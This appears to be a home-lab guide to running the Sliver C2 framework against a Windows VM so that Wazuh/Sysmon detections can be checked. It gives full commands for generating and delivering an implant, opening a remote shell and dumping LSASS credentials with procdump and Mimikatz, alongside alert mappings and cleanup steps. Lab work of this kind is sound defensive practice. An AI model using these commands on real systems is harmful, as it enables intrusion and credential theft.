# Sliver C2 — Setup and Operator Guide

> **WARNING: FOR AUTHORIZED HOME LAB USE ONLY**
> This guide documents tools used exclusively within the isolated UTM lab network
> (192.168.64.0/24). Never run implants or C2 listeners on production networks,
> corporate systems, or any machine you do not own and have written authorization to test.
> The lab network is NAT-isolated from your home LAN by UTM Shared Network mode.

---

## What Is Sliver?

[Sliver](https://github.com/BishopFox/sliver) is an open-source Command-and-Control (C2) framework developed by Bishop Fox. It generates realistic C2 implants (called "sessions") that establish encrypted communications with an operator-controlled server.

### Why Sliver over Metasploit/Cobalt Strike?

| Framework | Cost | ARM64 Implants | Detection Realism | Portfolio Use |
|-----------|------|---------------|-------------------|--------------|
| **Sliver** (chosen) | Free / OSS | Native ARM64 | High — mTLS/HTTP/2/DNS, real threat actors use it | Public portfolio — no license restrictions |
| Cobalt Strike | $3,500/year | Via beacon builds | Highest | **Cannot use in public portfolio** |
| Metasploit | Free | Partial | Low — Meterpreter is heavily signatured; not representative | OK but unrealistic alerts |
| Havoc C2 | Free | Inconsistent ARM64 | Medium | Less mature, fewer tutorials |

**Rationale:** Sliver was documented in a [2023 CISA advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a) as a framework used by real threat actors, making detections developed against it directly operationally relevant. It ships native ARM64 binaries for both the server and implant generation, which is required for our Windows 11 ARM64 victim VM.

---

## Lab Architecture

```
macOS Host (Apple Silicon)
└── UTM Shared Network: 192.168.64.0/24 (NAT — isolated from home LAN)
    ├── kali-attacker: 192.168.64.30
    │   └── sliver-server (operator interface + listener)
    │       └── HTTPS listener :443  ←── C2 channel
    └── victim-windows: 192.168.64.20
        └── sliver implant (beacon.exe)
            └── Outbound HTTPS → 192.168.64.30:443
```

The implant calls **out** to the server. The victim never needs to be directly accessible (no port-forward required).

---

## Prerequisites

- Kali Linux ARM64 VM running (192.168.64.30)
- SSH access from macOS host: `ssh -i ~/.ssh/soc-lab attacker@192.168.64.30`
- Ansible `kali-attacker.yml` playbook has already run (Sliver installed)

If Sliver is not yet installed, run:

```bash
# [macOS host] Run Ansible kali playbook
cd ~/Projects/soc-home-lab/ansible
ansible-playbook playbooks/kali-attacker.yml
```

Or manually install on Kali:

```bash
# [kali-attacker] Manual install
bash scripts/setup-sliver.sh
```

---

## Part 1: Start the Sliver Server

```bash
# [kali-attacker] Start server as daemon (background)
sudo sliver-server daemon

# Verify it's running
sudo systemctl status sliver

# Connect the operator client (interactive CLI)
sliver
# You should see the Sliver banner and a "sliver >" prompt
```

---

## Part 2: Generate an HTTPS Listener

```bash
# [kali-attacker — inside sliver client]
sliver > https --lport 443 --lhost 192.168.64.30

# Verify listener started
sliver > jobs
# Should show: [*] HTTPS listener running on 192.168.64.30:443

# SAFETY CHECK: Confirm the listener is bound to lab IP only
# (not 0.0.0.0 which would expose it on all interfaces)
```

From the macOS host:

```bash
ssh -i ~/.ssh/soc-lab attacker@192.168.64.30 "ss -tlnp | grep 443"
# Expected output: 192.168.64.30:443   ← CORRECT (lab-only)
# If you see 0.0.0.0:443, something is wrong — stop the listener
```

---

## Part 3: Generate an ARM64 Windows Implant

```bash
# [kali-attacker — inside sliver client]
sliver > generate \
  --https 192.168.64.30 \
  --os windows \
  --arch arm64 \
  --format exe \
  --save /tmp/ \
  --name beacon

# Sliver will print something like:
# [*] Generating new windows/arm64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 35s
# [!] Implant saved to /tmp/BEACON_XXXXXXXX.exe

# Note the filename — it includes a random suffix
ls /tmp/BEACON_*.exe
```

> **About the generated binary:** The EXE contains only the C2 beacon logic — no shellcode, no exploits. It establishes an encrypted mTLS/HTTPS session with the Sliver server. Wazuh/Sysmon will detect the outbound connection and process creation. That is the intended behavior for detection validation.

---

## Part 4: Transfer Implant to Windows Victim

**Method A: Python HTTP Server (simplest)**

```bash
# [kali-attacker] Serve the implant over HTTP
cd /tmp
python3 -m http.server 8080 --bind 192.168.64.30

# [victim-windows] Download via PowerShell (in Windows PowerShell as SOCAdmin)
$url = "http://192.168.64.30:8080/BEACON_XXXXXXXX.exe"
$dest = "$env:TEMP\beacon.exe"
Invoke-WebRequest -Uri $url -OutFile $dest
Write-Host "Downloaded to $dest"
```

**Method B: SCP via Kali to Windows (WinRM/SFTP)**

```bash
# [kali-attacker] Copy via scp (if WinRM SSH is configured)
scp -P 22 /tmp/BEACON_*.exe SOCAdmin@192.168.64.20:C:/Temp/beacon.exe
```

---

## Part 5: Execute the Implant on Windows Victim

```powershell
# [victim-windows — PowerShell as SOCAdmin]
# This triggers Sysmon EventID 1 (ProcessCreate) and EventID 3 (NetworkConnect)
# which are monitored by our Wazuh rules.
Start-Process "$env:TEMP\beacon.exe"

# Check if it ran
Get-Process | Where-Object { $_.Path -like "*beacon*" }
```

After a few seconds, return to the Sliver client on Kali:

```bash
# [kali — sliver client]
sliver > sessions
# Should show a new session (green indicator) with victim-windows hostname

# Interact with the session
sliver > use [SESSION_ID]
```

---

## Part 6: Basic C2 Operations

All commands below run inside a Sliver session. Each command generates
detectable Sysmon events on the victim.

```bash
# Identity and reconnaissance
sliver (beacon) > whoami
sliver (beacon) > getuid
sliver (beacon) > getpid

# Host information
sliver (beacon) > info
sliver (beacon) > netstat

# Process listing (useful for planning privilege escalation)
sliver (beacon) > ps

# File system
sliver (beacon) > ls C:\\Users\\SOCAdmin\\Desktop
sliver (beacon) > pwd

# Upload a file to victim (e.g., test file for evidence)
sliver (beacon) > upload /tmp/test.txt C:\\Temp\\test.txt

# Download a file from victim
sliver (beacon) > download C:\\Windows\\System32\\drivers\\etc\\hosts /tmp/hosts.txt

# Screenshot
sliver (beacon) > screenshot

# Interactive shell (generates Sysmon EID 1 for cmd.exe spawned by implant)
sliver (beacon) > shell
> whoami
> ipconfig /all
> exit
```

---

## Part 7: LSASS Credential Dumping via Sliver

> **Detection target:** Wazuh rule 100005 (T1003.001)

```bash
# [sliver session] Attempt to dump LSASS credentials
# Requires SYSTEM or SeDebugPrivilege
sliver (beacon) > procdump --pid [LSASS_PID] --save /tmp/lsass.dmp

# Find LSASS PID first
sliver (beacon) > ps
# Look for lsass.exe in the output, note the PID

# Alternative: use Mimikatz extension if available
sliver (beacon) > mimikatz -- "sekurlsa::logonpasswords exit"
```

---

## Part 8: Correlating Sliver Activity with Wazuh Detections

After running C2 operations, verify the expected alerts fired in Kibana:

```
http://192.168.64.10:5601
```

**Kibana query to find Sliver-related alerts:**

```json
{
  "query": {
    "bool": {
      "must": [
        { "range": { "timestamp": { "gte": "now-1h" } } },
        { "terms": { "rule.id": ["100005", "100006", "100007", "100009", "100010"] } }
      ]
    }
  }
}
```

**Expected alert mapping:**

| Sliver Action | Sysmon Event | Wazuh Rule | Level |
|---------------|-------------|------------|-------|
| beacon.exe process start | EID 1 (ProcessCreate from Temp) | 100006 | 6 |
| Beacon HTTPS connection | EID 3 (NetworkConnect from Temp) | 100009 | 6 |
| 10+ beacon connections | EID 3 × 10 | 100010 | 12 |
| LSASS procdump | EID 10 (ProcessAccess) | 100005 | 14 |
| Mimikatz extension | EID 10 + EID 7 | 100005 | 14 |
| Shell spawned | EID 1 (cmd.exe parent: beacon) | 100006 | 6 |

---

## Cleanup

```bash
# [sliver client] Kill the implant process and terminate session
sliver (beacon) > terminate --force

# Stop the HTTPS listener
sliver > jobs kill [JOB_ID]

# [victim-windows] Remove implant binary
Remove-Item "$env:TEMP\beacon.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Temp\beacon.exe" -Force -ErrorAction SilentlyContinue

# [kali] Remove generated implant files
rm -f /tmp/BEACON_*.exe
rm -f /tmp/lsass.dmp
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Session not appearing after executing implant | Check `sliver > jobs` — listener must be running; verify `192.168.64.30:443` reachable from victim |
| `generate` command hangs | First run downloads Go toolchain; can take 5–10 min on first use |
| "Access Denied" on LSASS | Need SYSTEM or SeDebugPrivilege — try `getsystem` first |
| Sysmon events not in Kibana | Check Filebeat service on Windows: `Get-Service filebeat` |

---

## Lab Safety Checklist

- [ ] UTM VM network mode = **Shared Network** (not Bridged)
- [ ] Sliver listener bound to `192.168.64.30`, NOT `0.0.0.0`
- [ ] macOS host firewall blocks inbound port 443 from LAN
- [ ] No implant binaries committed to the git repository
- [ ] VM snapshots taken before starting (UTM → right-click → New Snapshot)
